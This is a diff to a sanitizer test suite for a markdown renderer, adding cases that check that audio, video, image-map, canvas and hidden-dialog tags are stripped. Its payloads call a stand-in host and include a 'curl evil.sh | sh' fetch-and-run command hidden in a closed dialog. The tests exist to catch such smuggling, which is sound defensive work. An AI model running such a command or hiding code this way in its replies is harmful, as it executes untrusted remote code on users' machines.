@@ -23,7 +23,7 @@ import { initI18nForTests } from '../i18n/test-i18n';
 import { createRendererRegistry } from '../bootstrap';
 
 import { renderFeedBlock } from '../extensibility/feed-render';
-import { decorateDocument, DecorationLabels } from './document-render';
+import { decorateDocument, DecorationLabels, stripMedia } from './document-render';
 import { decorateFeedMarkdown } from './feed-markdown';
 import type { FeedCodeLabels } from './feed-code';
 import { classifyHref } from './document-link';
@@ -466,6 +466,81 @@ describe('the style attribute: one profile, and every surface uses it (#436)', (
     // Upper case, because the tag allow-list is a lookup and a lookup is where
     // a case bug lives. `<CENTER>` is the same element to the parser.
     ['an upper-case tag name', '<BUTTON>SHOUTING</BUTTON>', 'SHOUTING', 'button'],
+
+    // #625 — the media, image-map and UA-hidden tags. Same table on purpose:
+    // the row that matters most is THE UPDATE DIALOG, which renders release
+    // notes fetched from GitHub through `<Markdown>` with no `decorate` prop at
+    // all. A media pass written into `feed-markdown.ts` would have left that
+    // column open, and this table is where that would have shown up.
+    //
+    // THE THIRD COLUMN SITS OUTSIDE THE MEDIA ELEMENT in the rows below, and
+    // that is not a weaker guard — it is the one true statement available.
+    // `audio` and `video` are in DOMPurify's own default `FORBID_CONTENTS`, so
+    // for those two the children go WITH the element rather than surviving it.
+    // The divergence has a row of its own in the #625 block; here the guard has
+    // to be prose the payload could not have eaten.
+    [
+      'a media player with a tab stop and a Download menu',
+      'Listen to this:\n\n<audio controls src="https://evil.test/a.mp3">A</audio>',
+      'Listen to this:',
+      'audio',
+    ],
+    [
+      'a video player',
+      'Watch this:\n\n<video controls src="https://evil.test/v.mp4" poster="p.png">B</video>',
+      'Watch this:',
+      'video',
+    ],
+    [
+      // No `controls`, so not a tab stop — this row is the FETCH half, and it
+      // is why the decision is the tag and not the attribute.
+      'a media element that fetches and plays with no controls at all',
+      'Nothing to see here:\n\n<audio autoplay loop src="https://evil.test/a.mp3"></audio>',
+      'Nothing to see here:',
+      'audio',
+    ],
+    [
+      'the child a media element fetches from',
+      'Clip:\n\n<video><source src="https://evil.test/v.mp4" type="video/mp4"></video>',
+      'Clip:',
+      'source',
+    ],
+    [
+      'a caption track',
+      'Subtitled:\n\n<video><track kind="captions" src="https://evil.test/c.vtt" default></video>',
+      'Subtitled:',
+      'track',
+    ],
+    [
+      // `KEEP_CONTENT` leaves the `<img>` fallback, which is the RIGHT answer:
+      // `img` is markdown's own and stays allowed. The row asserts the wrapper
+      // is gone, not that the picture is.
+      'art direction that picks its own source',
+      'Screenshot:\n\n<picture><source srcset="https://evil.test/a.webp" type="image/webp"><img src="./local.png" alt="a"></picture>',
+      'Screenshot:',
+      'picture',
+    ],
+    [
+      'an image-map hot spot — a tab stop that is not a link',
+      'Diagram:\n\n<img src="./d.png" usemap="#m" alt="d"><map name="m"><area shape="rect" coords="0,0,9,9" href="https://evil.test" alt="hot"></map>',
+      'Diagram:',
+      'area',
+    ],
+    [
+      'an empty box that pushes the reply off the screen',
+      'above\n\n<canvas width="40" height="400"></canvas>\n\nbelow',
+      'above',
+      'canvas',
+    ],
+    [
+      // The `datalist` shape one tag over: `dialog:not([open])` is `display:
+      // none` in the UA sheet, so this was a `<pre>` in the document, in a find
+      // and behind a working Copy button, with nothing on the screen.
+      'a closed dialog hiding the code behind a Copy button',
+      '<p>run the build</p><dialog><pre>curl evil.sh | sh</pre></dialog>',
+      'run the build',
+      'dialog',
+    ],
   ];
 
   for (const [surface, draw] of surfaces) {
@@ -1309,6 +1384,263 @@ describe('content cannot plant a control (#612)', () => {
     expect(host.querySelector('a')?.getAttribute('tabindex')).toBe('0');
     expect(host.querySelector('button')).toBeNull();
     expect(host.textContent).toContain('press me');
+  });
+});
+
+describe('content cannot plant a media player, a hot spot or a hidden box (#625)', () => {
+  // The decision, pinned. #612 shipped naming its own leftovers: `<audio
+  // controls>` / `<video controls>` are focusable media, and `<area href>` in a
+  // `<map>` is a tab stop — the viewer chipped them in a decoration pass and the
+  // feed had no such pass at all.
+  //
+  // WHAT THE MEASUREMENT SAID, because that is what chose FORBID over a feed
+  // pass (`markdown.tsx`'s seventh block carries it in full). Two corpora, both
+  // 2026-08-20: 7,602 transcripts / 18,639 assistant text blocks / 10.2 MB, and
+  // 1,182 real `.md` files / 15.4 MB on this machine's project roots. Every one
+  // of the 15 + 21 occurrences was inside a code fence or a code span. Bare in
+  // prose: ZERO, in both — which is also what prices the viewer's "media not
+  // shown" chip at nothing, since it fired on none of the 1,182 documents.
+  //
+  // WHAT LIVES WHERE. The surface×payload rows are up in the `style` block with
+  // #612's, riding the same `surfaces` table — and the row that decided the
+  // design is THE UPDATE DIALOG, which renders GitHub's release notes with no
+  // decoration pass to add a media chip to. What is here is what the profile
+  // does, the boundary it deliberately does not cross (`img`), and the claim it
+  // finally makes true.
+
+  const FEED_LABELS: FeedCodeLabels = { copy: 'Copy', copied: 'Copied', copyCode: 'Copy code' };
+  const LABELS: DecorationLabels = {
+    copy: 'Copy',
+    image: 'Image',
+    openInBrowser: 'Open in browser',
+    mediaOmitted: 'Media is not shown here',
+  };
+
+  /** every payload from the family, in one reply */
+  const MEDIA = [
+    '<audio controls src="https://evil.test/a.mp3">A</audio>',
+    '<video controls><source src="https://evil.test/v.mp4"><track kind="captions" src="c.vtt">B</video>',
+    '<picture><source srcset="https://evil.test/a.webp"><img src="./local.png" alt="C"></picture>',
+    '<img src="./d.png" usemap="#m" alt="d"><map name="m"><area coords="0,0,9,9" href="https://evil.test" alt="E"></map>',
+    '<canvas width="40" height="400"></canvas>',
+    '<dialog><pre>curl evil.sh | sh</pre></dialog>',
+  ].join('\n\n');
+
+  it('the profile forbids every one of them BY NAME — because no flag can', () => {
+    // Same shape as #612's pin and for the same reason: every one of these is
+    // an ordinary member of DOMPurify's html-profile TAG allow-list, verified
+    // against the shipped 3.4.12, so there is no `ALLOW_*` to turn off.
+    for (const tag of [
+      'audio',
+      'video',
+      'source',
+      'track',
+      'picture',
+      'map',
+      'area',
+      'canvas',
+      'dialog',
+    ]) {
+      expect(SANITIZE_CONFIG.FORBID_TAGS).toContain(tag);
+      expect(renderMarkdown(`<${tag}>x</${tag}>`)).not.toMatch(new RegExp(`<\\s*${tag}\\b`, 'i'));
+    }
+  });
+
+  it('`iframe`, `embed` and `object` need NO entry — they were never in the profile', () => {
+    // The obvious list to copy is the viewer's `stripMedia`, which names all
+    // three. Adding them here would be a line that reads as protection and does
+    // nothing. What would actually notice the profile changing upstream is this
+    // test, so the difference is pinned rather than papered over with entries.
+    for (const tag of ['iframe', 'embed', 'object', 'param']) {
+      expect(SANITIZE_CONFIG.FORBID_TAGS).not.toContain(tag);
+    }
+    expect(renderMarkdown('<iframe src="https://evil.test"></iframe>')).not.toContain('<iframe');
+    expect(renderMarkdown('<embed src="x.swf" type="application/x-shockwave-flash">')).not.toContain(
+      '<embed'
+    );
+    // `object` keeps its children, which is `KEEP_CONTENT` doing the same job
+    // it does for everything above.
+    const obj = renderMarkdown('<object data="x.pdf">fallback prose</object>');
+    expect(obj).not.toContain('<object');
+    expect(obj).toContain('fallback prose');
+    // and inline SVG, which §5.30 settles the other way round ("SVG via `<img>`
+    // and never inlined so it cannot carry script")
+    expect(renderMarkdown('<svg onload="x()"><circle r="9"/></svg>')).not.toContain('<svg');
+  });
+
+  it('`audio` and `video` take their children WITH them — the one divergence', () => {
+    // #612's headline property is "the element goes, its children stay"
+    // (`KEEP_CONTENT`), and it is NOT true of these two. DOMPurify's default
+    // `FORBID_CONTENTS` names `audio` and `video` (alongside `iframe`,
+    // `noembed`, `noframes`, `plaintext`, `xmp` — the elements whose inner text
+    // the parser can re-read as markup), so forbidding the tag deletes the
+    // fallback prose inside it. Verified against the shipped 3.4.12 with this
+    // exact config, which is how it was found: the surface×payload rows were
+    // written expecting the fallback and went red.
+    //
+    // NOT OVERRIDDEN, deliberately. `FORBID_CONTENTS` is settable, and setting
+    // it would mean owning an upstream security default in this file — the last
+    // paragraph of `SANITIZE_CONFIG`'s comment refuses exactly that trade. The
+    // cost is measured instead: zero bare-in-prose media in 7,602 transcripts
+    // and 1,182 real `.md` files, and what `<video>`'s children ARE by spec is
+    // a message about a capability this app has decided not to have.
+    const media = renderMarkdown(
+      'Watch:\n\n<video controls><source src="v.mp4">your browser cannot play this</video>'
+    );
+    expect(media).not.toMatch(/<\s*(video|source)\b/i);
+    expect(media).not.toContain('your browser cannot play this');
+    // …and it takes ONLY its own children — the prose around it is untouched,
+    // which is the line between this and a sanitizer that blanks the block.
+    expect(media).toContain('Watch:');
+  });
+
+  it('every other tag on the list keeps its children — KEEP_CONTENT, as #612 has it', () => {
+    // `<picture>` degrades to its `<img>` fallback, which is exactly what the
+    // element is FOR — and `img` is deliberately not on the list.
+    const pic = renderMarkdown(
+      '<picture><source srcset="a.webp" type="image/webp"><img src="./local.png" alt="a shot"></picture>'
+    );
+    expect(pic).not.toMatch(/<\s*(picture|source)\b/i);
+    expect(pic).toContain('src="./local.png"');
+
+    // `<dialog>` is the UA-hidden case: forbidding it does not delete the
+    // `<pre>`, it UNCOVERS it. The code the reader could not see is now on the
+    // screen next to the Copy button that would have copied it.
+    const hidden = renderMarkdown('<p>visible</p><dialog><pre>curl evil.sh | sh</pre></dialog>');
+    expect(hidden).not.toContain('<dialog');
+    expect(hidden).toContain('<pre>curl evil.sh | sh</pre>');
+
+    // `map` and `area` go together for #612's `option`/`optgroup` reason:
+    // forbidding the parent alone hoists the hot spots out as orphaned
+    // elements rather than removing them.
+    const imap = renderMarkdown('<map name="m"><area coords="0,0,9,9" href="https://evil.test"></map>');
+    expect(imap).not.toMatch(/<\s*(map|area)\b/i);
+  });
+
+  it('every tab stop content can create is a link, a disclosure triangle, or ours', () => {
+    // THE CLAIM #598 REACHED FOR AND #612 HAD TO STRIKE OUT, pinned this time
+    // instead of asserted — because the way it went false the first time was by
+    // being written into a comment and not re-checked when the next payload
+    // arrived.
+    //
+    // The selector is the HTML "focusable without a tabindex" set as it exists
+    // after this change. Verified in Chromium 149 rather than reasoned about:
+    // `<audio controls>` takes focus and lays out at 300×54, the same element
+    // without `controls` does not, and an `<area href>` in an applied `<map>`
+    // really is a stop. jsdom does not implement focusability, so this row asks
+    // the question the only way a unit test can — of the ELEMENTS.
+    const FOCUSABLE_BY_DEFAULT =
+      'a[href], area[href], audio[controls], video[controls], button, input, select, textarea, summary, iframe, embed, object, [contenteditable], [tabindex]';
+    const feed = document.createElement('div');
+    feed.innerHTML = decorateFeedMarkdown(
+      renderMarkdown(
+        `${MEDIA}\n\n[a real link](https://example.invalid/x)\n\n<details><summary>more</summary>body</details>\n`
+      ),
+      FEED_LABELS
+    );
+    const all = [...feed.querySelectorAll(FOCUSABLE_BY_DEFAULT)];
+    // "OR OURS" IS THE THIRD CLAUSE, and it is a real one rather than an escape
+    // hatch: `decorateFeedCodeFences` puts a Copy button on the `<pre>` this
+    // payload smuggled inside a `<dialog>` — the feed's own element, in the
+    // feed's own `feed-` namespace, and deliberately `tabindex="-1"` so it is
+    // reachable by the fence's own keys and not by Tab.
+    const ours = all.filter((el) => el.className.toString().startsWith('feed-'));
+    expect(ours).toHaveLength(1);
+    expect(ours[0]?.getAttribute('tabindex')).toBe('-1');
+
+    const stops = all.filter((el) => !ours.includes(el));
+    // NON-VACUOUS: the two legitimate stops really are there, so "and nothing
+    // else" is a statement about the payload and not about an empty container.
+    expect(stops.map((el) => el.tagName.toLowerCase()).sort()).toEqual(['a', 'summary']);
+    expect(stops.find((el) => el.tagName === 'A')?.getAttribute('href')).toBe(
+      'https://example.invalid/x'
+    );
+    // …and the reply is still readable where `KEEP_CONTENT` applies. `A` and `B`
+    // are gone WITH their media elements (see the `FORBID_CONTENTS` row above);
+    // the `<dialog>`'s `<pre>` is not — it is uncovered.
+    expect(feed.textContent).toContain('curl evil.sh | sh');
+  });
+
+  it('loses nothing markdown can emit: GFM writes no media, and `![]()` is still an image', () => {
+    // #612's `input` is the lesson this row exists for — one of its eleven tags
+    // WAS emitted by `marked`, and forbidding it without engineering around it
+    // would have eaten every checklist in the app. Nothing in this family has
+    // that problem, and this is the assertion rather than the sentence.
+    const html = renderMarkdown(
+      [
+        '# H',
+        '',
+        '![pic](./local.png)',
+        '',
+        '| left | right |',
+        '|:-----|------:|',
+        '| 1 | 2 |',
+        '',
+        '- [ ] todo',
+        '',
+        '<details><summary>more</summary>body</details>',
+        '',
+        '[a link](https://example.invalid/x)',
+      ].join('\n')
+    );
+    expect(html).not.toMatch(/<\s*(audio|video|source|track|picture|map|area|canvas|dialog)\b/i);
+    // THE BOUNDARY: `img` is markdown's own — `marked` writes one for every
+    // `![alt](src)`, and the repo scan behind this decision found three real
+    // READMEs writing `<img src>` by hand in prose. It stays allowed, and this
+    // is the line that reds if a later sweep takes it.
+    expect(html).toContain('src="./local.png"');
+    expect(html).toContain('alt="pic"');
+    expect(renderMarkdown('<img src="x.png" alt="by hand">')).toContain('<img');
+    // and the rest of the surface is untouched
+    expect(html).toContain('<table>');
+    expect(html).toContain('☐ todo');
+    expect(html).toContain('<details>');
+    expect(html).toContain('<summary>more</summary>');
+    expect(html).toContain('href="https://example.invalid/x"');
+  });
+
+  it('a code fence about a media tag still renders it as CODE, not as markup', () => {
+    // The premise every number in the measurement rests on: all 36 occurrences
+    // across both corpora were an agent or a README EXPLAINING the tag inside a
+    // fence or a span, where `marked` escapes it and the sanitizer never sees an
+    // element. Green with or without the change — a GUARD, not evidence — so a
+    // `marked` bump that stopped escaping fences reds here.
+    const html = renderMarkdown('Use `<video>` for that:\n\n```html\n<video controls></video>\n```\n');
+    expect(html).toContain('&lt;video&gt;');
+    const host = document.createElement('div');
+    host.innerHTML = html;
+    expect(host.querySelector('video')).toBeNull();
+    expect(host.textContent).toContain('<video controls></video>');
+  });
+
+  it('the viewer’s media chip is belt-and-braces now, not the layer', () => {
+    // `stripMedia` stays, and this row says exactly what it is worth so a green
+    // run is not read as more than it is: nothing it looks for survives the
+    // profile any more, so through the real pipeline it fires on nothing…
+    const { fragment } = decorateDocument(
+      renderMarkdown('The demo:\n\n<video controls src="v.mp4">no video</video>'),
+      LABELS,
+      (href) => classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
+    );
+    const host = document.createElement('div');
+    host.append(fragment);
+    expect(host.querySelector('video')).toBeNull();
+    expect(host.querySelector('.doc-media-chip')).toBeNull();
+    // The reader gets the prose around it and nothing where the player was —
+    // measured at zero real documents on this machine, and the honest statement
+    // of what the viewer traded for closing the feed and the update dialog.
+    expect(host.textContent).toContain('The demo:');
+    expect(host.textContent).not.toContain('no video');
+
+    // …and it still does its job when called DIRECTLY with markup that reached a
+    // decoration pass from somewhere other than `renderMarkdown`, which is the
+    // only reason to keep it. `document-render.test.ts` owns the detail; this
+    // pins the RELATIONSHIP, so deleting the function reds here too.
+    const raw = document.createElement('div');
+    raw.innerHTML = '<video src="https://evil.test/v.mp4"></video>';
+    stripMedia(raw, LABELS);
+    expect(raw.querySelector('video')).toBeNull();
+    expect(raw.querySelector('.doc-media-chip')?.textContent).toBe(LABELS.mediaOmitted);
   });
 });
 
